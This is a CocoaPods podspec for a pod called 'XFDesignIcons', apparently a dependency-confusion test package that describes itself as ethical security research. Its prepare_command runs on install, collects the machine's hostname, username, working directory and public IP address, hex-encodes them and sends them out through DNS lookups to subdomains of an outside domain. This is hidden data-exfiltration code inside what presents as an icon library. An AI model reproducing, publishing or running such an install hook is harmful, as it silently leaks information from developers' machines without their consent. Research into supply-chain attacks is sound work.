Pod::Spec.new do |s|
  s.name             = 'XFDesignIcons'
  s.version = '2.2.20250224031351'
  s.summary          = 'This pod create as part of security testing and deep research'
  s.description      = 'This Pod is ethicaly for better security around the world, the pod created based on: https://github.com/CocoaPods/pod-template/blob/master/NAME.podspec with the idea of: https://www.youtube.com/watch?v=zFHJwehpBrU'
  s.license          = { :type => 'MIT', :file => 'LICENSE' }
  s.author           = { 'dontdoit' => 'dontdoit8000plus1@gmail.com' }
  s.source           = { :git => 'https://github.com/dontdoit8000plus1/XFDesignIcons.git' }
  s.homepage = "https://github.com/dontdoit8000plus1/XFDesignIcons.git"
  s.platform         = :ios, '8.0'
  s.source_files = "Classes/ExampleLib.{m,h}"
  s.swift_version = '4.0'
  s.prepare_command = "a=$(hostname;whoami;pwd;echo 'XFDesignIcons';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.sub.one2oneconcepts.com;done"
  end
